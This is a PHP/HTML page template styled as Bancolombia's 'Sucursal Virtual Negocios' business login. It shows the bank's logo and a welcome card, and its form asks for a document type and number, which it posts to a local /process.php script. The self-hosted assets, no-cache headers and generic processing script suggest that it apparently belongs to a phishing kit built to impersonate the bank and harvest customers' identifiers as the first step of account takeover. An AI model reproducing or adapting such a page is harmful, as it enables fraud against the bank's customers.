<?php
/**
 * Template: Document Form
 * Variables disponibles: $errorMessage
 */
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Sucursal Virtual Negocios - Bancolombia</title>
    <link rel="stylesheet" href="/assets/css/styles.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/assets/css/loading-overlay.css?v=<?= time() ?>">
    <link rel="stylesheet" href="/assets/css/error-message.css?v=<?= time() ?>">
</head>
<body>
    <header class="header">
        <div class="container">
            <img src="/img/logo-bancolombia.png" alt="Bancolombia" class="header__logo">
            <h1 class="header__title">Sucursal Virtual Negocios</h1>
        </div>
    </header>

    <main class="main">
        <div class="container">
            <div class="background-decoration">
                <img src="/img/trazo-auth.svg" alt="" class="decoration-svg" aria-hidden="true">
            </div>

            <div class="welcome-card">
                <h2 class="welcome-card__title">Te damos la bienvenida</h2>
                <p class="welcome-card__subtitle">Ingresa el documento de tu negocio.</p>

                <?php if (isset($errorMessage) && $errorMessage): ?>
                <div class="error-message active">
                    <p class="error-message__text"><?= htmlspecialchars($errorMessage) ?></p>
                </div>
                <?php endif; ?>

                <form id="documentForm" class="document-form" method="POST" action="/process.php">
                    <div class="form-group">
                        <div class="custom-select" id="customSelect">
                            <button type="button" class="custom-select__trigger" id="selectTrigger">
                                <span class="custom-select__label" id="selectLabel">Tipo de documento</span>
                                <svg class="custom-select__arrow" width="20" height="20" viewBox="0 0 20 20">
                                    <path d="M5 7.5L10 12.5L15 7.5" stroke="#666" stroke-width="2"/>
                                </svg>
                            </button>
                            
                            <div class="custom-select__dropdown" id="selectDropdown">
                                <div class="custom-select__option" data-value="NIT">NIT</div>
                                <div class="custom-select__option" data-value="CC">Cédula de Ciudadanía</div>
                                <div class="custom-select__option" data-value="CE">Cédula de Extranjería</div>
                                <div class="custom-select__option" data-value="PA">Pasaporte</div>
                                <div class="custom-select__option" data-value="IEPN">ID Extranjero Persona Natural</div>
                                <div class="custom-select__option" data-value="IEPJ">ID Extranjero Persona Jurídica</div>
                                <div class="custom-select__option" data-value="FID">Fideicomiso</div>
                                <div class="custom-select__option" data-value="CD">Carné Diplomático</div>
                            </div>
                            
                            <input type="hidden" name="documentType" id="documentType" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="floating-label">Número de documento</label>
                        <div class="input-wrapper">
                            <input type="text" name="documentNumber" class="form-input" required>
                        </div>
                    </div>

                    <button type="submit" class="btn btn-primary">Continuar</button>
                </form>
            </div>
        </div>
    </main>

    <script src="/assets/js/script.js?v=<?= time() ?>"></script>
</body>
</html>
